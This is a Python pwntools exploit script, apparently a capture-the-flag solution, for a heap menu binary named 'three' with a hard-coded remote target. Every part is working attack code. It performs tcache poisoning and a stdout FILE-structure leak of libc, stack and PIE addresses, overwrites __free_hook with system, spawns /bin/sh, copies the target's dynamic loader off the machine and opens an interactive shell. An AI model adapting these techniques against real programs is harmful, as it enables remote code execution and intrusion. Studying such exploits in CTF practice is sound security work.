#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./three"
os.environ = {"LD_LIBRARY_PATH":"./"}
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")
heap_add=0
stack_add=0
r=None
def get_cc():
    global r
    if len(sys.argv)==1:
        r=process(pwn_file)
        pid=r.pid
    else:
        r=remote("39.96.13.122",9999)
        pid=0


def debug():
    log.debug("process pid:%d"%pid)
    log.debug("stack add:0x%x"%stack_add)
    log.debug("pie add:0x%x"%elf.address)
    log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()

def add(con):
    global r
    r.sendafter("choice:","1")
    r.sendafter("content:",con)

def dele(idx,delete= False):
    global r
    r.sendlineafter("choice:","3")
    r.sendlineafter("idx:",str(idx))
    r.sendlineafter("Clear?(y/n):","y" if delete else "n")

def edit(idx,cont):
    global r
    r.sendlineafter("choice:","2")
    r.sendlineafter("idx:",str(idx))
    r.sendafter("content:",cont)

while True:
    try:
        get_cc()
        add(p64(0x91)*2+p64(0)+p64(0x91)*5)
        add(p64(0x91)*8)
        add(p64(0x21)*8)

        dele(1,True)
        dele(2,True)
        dele(0)
        dele(0)
        edit(0,"\x70")
        add("a")
        add("a")
        for i in range(7):
            dele(2)
        dele(2,True)

        dele(1,True)
        dele(0)
        edit(0,"\x70")
        add("a"*0x8+p64(0x31)+"\x60\x37")
        add("\xa0")
        dele(2,True)

        add(p64(0xfbad3c80)+p64(0)*3+"\x00")
        libc.address = u64(r.recv(16)[8:]) - 0x3b18b0 - 0x3c000
        break
    except Exception as e:
        r.close()

dele(0,True)
dele(1,True)

#add(p64(0xdeadbeef)+ p64(0x61)+p64(0)+p64(libc.sym["_IO_2_1_stdout_"]+0x88-0x30))
edit(2,p64(0xfbad3c80)+p64(libc.sym["environ"])*4+p64(libc.sym["environ"]+0x100)*3)
stack_add = u64(r.recv(8))

r.sendline("2")
r.sendline("2")
sleep(0.5)
r.send(p64(0xfbad3c80)+p64(stack_add)*4+p64(stack_add+0x108)*3)
r.recvuntil(p64(0x0000000000000003))
elf.address = u64(r.recv(8))-0x40

r.sendline("1")
r.sendline(p64(libc.sym["__malloc_hook"]))

r.sendline("2")
r.sendline("2")
sleep(0.5)
r.send(p64(0x00000000fbad2887)+p64(elf.address+0x202050)*7)

r.sendline("2")
r.sendline("2")
sleep(0.5)
r.send(p64(0xfbad2887)+p64(elf.address+0x202a00)*7)

edit(0,"\x00"*6+"\x00"*0x18+p64(0x41)+p64(libc.sym["__free_hook"]))
add("a")
dele(1,True)

add(p64(libc.sym["system"]))
edit(2,"/bin/sh\x00")
r.sendline("3")
r.sendline("2")
r.clean()
r.sendline("cat /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2")
f = open("ld","w+")
while True:
    data = r.recv(1024,timeout = 1)
    if data == "":
        break
    f.write(data)

f.close()

r.interactive()
